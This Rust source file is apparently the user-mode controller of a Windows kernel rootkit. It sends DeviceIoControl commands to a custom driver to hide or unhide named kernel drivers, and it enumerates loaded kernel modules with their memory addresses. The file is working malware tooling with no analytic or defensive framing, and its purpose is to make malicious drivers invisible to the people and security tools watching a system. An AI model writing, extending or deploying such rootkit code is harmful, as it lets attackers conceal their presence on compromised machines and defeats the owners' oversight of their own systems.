use {
    log::*,
    crate::utils::open_driver, 
    core::mem::size_of, 
    shared::structs::{DriverInfo, TargetDriver}, 
    std::{ffi::c_void, ptr::null_mut}, 
    windows_sys::Win32::{
        Foundation::{CloseHandle, GetLastError}, 
        System::IO::DeviceIoControl
    } 
};

pub fn unhide_hide_driver(ioctl_code: u32, name: &String, enable: bool) {
    debug!("Attempting to open the driver for {} operation", if enable { "hide" } else { "unhide" });
    let h_file = open_driver().expect("Failed to open driver");

    debug!("Preparing structure for: {}", name);
    let mut info_driver = TargetDriver {
        name: name.to_string(),
        enable
    };

    debug!("Sending DeviceIoControl command to {} driver", if enable { "hide" } else { "unhide" });
    let mut return_buffer = 0;
    let status = unsafe { 
        DeviceIoControl(
            h_file,
            ioctl_code,
            &mut info_driver as *mut _ as *mut c_void,
            size_of::<TargetDriver>() as u32,
            null_mut(),
            0,
            &mut return_buffer,
            null_mut()
        )
    };

    if status == 0 {
        error!("DeviceIoControl failed with status: 0x{:08X}", unsafe { GetLastError() });
    } else {
        info!("Driver successfully {}hidden", if enable { "" } else { "un" });
    }

    debug!("Closing the driver handle");
    unsafe { 
        CloseHandle(h_file);
    };
}

pub fn enumerate_driver(ioctl_code: u32) {
    debug!("Attempting to open the driver for enumeration");
    let h_file = open_driver().expect("Failed to open driver");

    debug!("Allocating memory for driver info");
    let mut driver_info: [DriverInfo; 400] = unsafe { std::mem::zeroed() };
    let mut return_buffer = 0;

    debug!("Sending DeviceIoControl command to enumerate drivers");
    let status = unsafe { 
        DeviceIoControl(
            h_file,
            ioctl_code,
            null_mut(),
            0,
            driver_info.as_mut_ptr() as *mut _,
            (driver_info.len() * size_of::<DriverInfo>()) as u32,
            &mut return_buffer,
            null_mut()
        )
    };

    if status == 0 {
        error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
    } else {
        let total_modules = return_buffer as usize / size_of::<DriverInfo>();
        info!("Total modules found: {}", total_modules);
        info!("Listing drivers:");
        println!("");

        for i in driver_info.iter() {
            if i.address > 0 {
                let name = match String::from_utf16(&i.name) {
                    Ok(name) => name,
                    Err(err) => {
                        error!("UTF-16 decoding error: {:?}", err);
                        continue;
                    }
                };

                println!(
                    "[{:2}]  {:#018x}  {}",
                    i.index,               
                    i.address,             
                    name                   
                );
            }
        }
        println!("");
        info!("Driver enumeration completed.");
    }

    debug!("Closing the driver handle");
    unsafe { 
        CloseHandle(h_file);
    };
}

